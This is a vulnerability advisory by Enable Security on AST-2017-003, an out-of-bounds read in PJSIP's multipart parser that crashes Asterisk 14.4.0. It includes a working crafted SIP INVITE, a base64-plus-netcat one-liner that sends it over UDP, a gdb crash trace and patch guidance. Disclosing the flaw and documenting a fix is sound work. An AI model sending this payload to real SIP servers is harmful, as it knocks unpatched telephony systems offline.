# Out of bound memory access in PJSIP multipart parser crashes Asterisk

- Authors: 
    - Alfred Farrugia <alfred@enablesecurity.com>
    - Sandro Gauci <sandro@enablesecurity.com>
- Vulnerable version: Asterisk 14.4.0 running `chan_pjsip`, PJSIP 2.6
- References: AST-2017-003
- Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2017-02-asterisk-pjsip-multi-part-crash>
- Vendor Advisory: <http://downloads.asterisk.org/pub/security/AST-2017-003.html>
- Timeline:
    - Report date: 2017-04-13
    - Digium confirmed issue: 2017-04-13
    - Digium patch and advisory: 2017-05-19
    - PJSIP added patch by Digium: 2017-05-21
    - Enable Security advisory: 2017-05-23

## Description

A specially crafted SIP message with a malformed multipart body was found to cause a segmentation fault.

## Impact

Abuse of this vulnerability leads to denial of service in Asterisk when `chan_pjsip` is in use. This vulnerability is likely to affect other code that makes use of PJSIP.

## How to reproduce the issue

We started Asterisk by running `$PREFIX/asterisk/sbin/asterisk -fc`. Then we made use of the following SIP message which was sent to Asterisk over UDP to reproduce the issue:

    INVITE sip:2565551100@one.example.com SIP/2.0
    Via: SIP/2.0/UDP sip.example.com;branch=7c337f30d7ce.1
    From: "Alice, A," <sip:bob@example.com>
    To: Bob <sip:bob@example.com>
    Call-ID: 602214199@mouse.wonderland.com
    CSeq: 1 INVITE
    Contact: Alice <sip:alice@mouse.wonderland.com>
    content-type: multipart/mixed;`boundary=++

    --
    --++=AAA
    xxx
    --+

Note that the above SIP message only contains new lines (i.e. `\n`) and no carriage returns (i.e. `\r`). We sent this message by making use of netcat as follows:

    echo 'SU5WSVRFIHNpcDoyNTY1NTUxMTAwQG9uZS5leGFtcGxlLmNvbSBTSVAvMi4wClZpYTogU0lQLzIuMC9VRFAgc2lwLmV4YW1wbGUuY29tO2JyYW5jaD03YzMzN2YzMGQ3Y2UuMQpGcm9tOiAiQWxpY2UsIEEsIiA8c2lwOmJvYkBleGFtcGxlLmNvbT4KVG86IEJvYiA8c2lwOmJvYkBleGFtcGxlLmNvbT4KQ2FsbC1JRDogNjAyMjE0MTk5QG1vdXNlLndvbmRlcmxhbmQuY29tCkNTZXE6IDEgSU5WSVRFCkNvbnRhY3Q6IEFsaWNlIDxzaXA6YWxpY2VAbW91c2Uud29uZGVybGFuZC5jb20+CmNvbnRlbnQtdHlwZTogbXVsdGlwYXJ0L21peGVkO2Bib3VuZGFyeT0rKwoKLS0KLS0rKz1BQUEKeHh4Ci0tKw==' | base64 -d - | nc -u localhost 5060

The following is a log from running Asterisk in gdb:

    gdb --args asterisk -c

    ....

    Asterisk Ready.
    Program received signal SIGSEGV, Segmentation fault.
    [Switching to Thread 0x7fffd6b85700 (LWP 2625)]
    0x00007ffff783fd4c in parse_multipart_part (pool=0x1dff930, 
        start=0x7ffff0004359 "--++=Discussion of Mbone Engineering Issues\ne=mbone@somewhere.com\nc=IN IP4 224.2.0.1/127\nt=0 0\nm=audio 3456 RTP/AVP 0\na=rtpmapt...\n--+", 
        len=18446744073709551615, pct=0x1dffd60) at ../src/pjsip/sip_multipart.c:435
    435             while (p!=end && *p!='\n') ++p;

The issue appears to be due to a loop that keeps running until the wrong memory location is read. This leads to a memory access violation. This issue is to be found within `parse_multipart_part` at `pjsip/sip_multipart.c:435`.

This issue was found using [AFL](http://lcamtuf.coredump.cx/afl/), while fuzzing PJSIP. 

## Solutions and recommendations

Apply fix issued by Asterisk, upgrade to Asterisk 13.15.1, 14.4.1 or 13.13-cert4.

If making use of PJSIP, apply the patch in revision 5594. See <https://trac.pjsip.org/repos/ticket/2017>.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.